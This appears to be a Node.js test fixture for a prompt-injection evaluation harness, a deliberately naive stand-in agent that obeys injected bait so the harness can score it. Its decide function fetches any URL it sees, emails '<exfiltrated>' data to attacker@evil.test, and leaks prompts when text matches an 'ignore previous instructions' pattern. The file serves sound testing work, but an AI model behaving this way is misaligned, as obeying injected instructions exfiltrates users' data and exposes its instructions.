#!/usr/bin/env node
/**
 * Tiny CommandAgent fixture for test/eval.test.js — a stand-in "real agent".
 *
 * Implements the mcpwn eval CommandAgent contract: read ONE JSON observation from
 * stdin, write ONE JSON action to stdout. It is deliberately a NAIVE follower (it
 * obeys any injected bait it sees) so the harness scores it as having fallen for
 * the scenario, proving the JSON-over-stdio pipe works end-to-end. It imports no
 * SDK and reads no API key — exactly the contract mcpwn documents.
 *
 *   stdin  <- AgentObservation JSON
 *   stdout -> {"type":"tool_call","tool":"...","arguments":{...}}
 *          |  {"type":"final","message":"..."}
 */

function readStdin() {
  return new Promise((resolve) => {
    let buf = "";
    process.stdin.on("data", (c) => (buf += c.toString("utf8")));
    process.stdin.on("end", () => resolve(buf));
  });
}

function decide(obs) {
  const text = String(obs.visibleText ?? "");
  const url = text.match(/\bhttps?:\/\/[^\s"'<>)]+/i);
  if (url) return { type: "tool_call", tool: "fetch", arguments: { url: url[0] } };
  if (/send_email|attacker@evil\.test/i.test(text)) {
    const to = text.match(/to=([^)\s,"]+)/i);
    return {
      type: "tool_call",
      tool: "send_email",
      arguments: { to: to ? to[1] : "attacker@evil.test", body: "<exfiltrated>" },
    };
  }
  if (/system prompt/i.test(text) && /ignore\s+(all\s+)?previous\s+instructions/i.test(text)) {
    return { type: "final", message: (obs.samplingPrompts || []).join(" ") || text };
  }
  // Benign: call the first non-exfil tool we have not called yet (so we can reach
  // a poisoned RESULT), else answer.
  const called = new Set(
    (obs.transcript || [])
      .map((s) => (s.action && s.action.type === "tool_call" ? s.action.tool : null))
      .filter(Boolean)
  );
  const tools = Array.isArray(obs.tools) ? obs.tools : [];
  const benign = tools.find((t) => !/send_email|exfil|email|webhook/i.test(t.name) && !called.has(t.name));
  if (benign) return { type: "tool_call", tool: benign.name, arguments: {} };
  return { type: "final", message: "done" };
}

const raw = await readStdin();
let obs = {};
try {
  obs = JSON.parse(raw);
} catch {
  /* leave obs empty → benign final */
}
process.stdout.write(JSON.stringify(decide(obs)) + "\n");
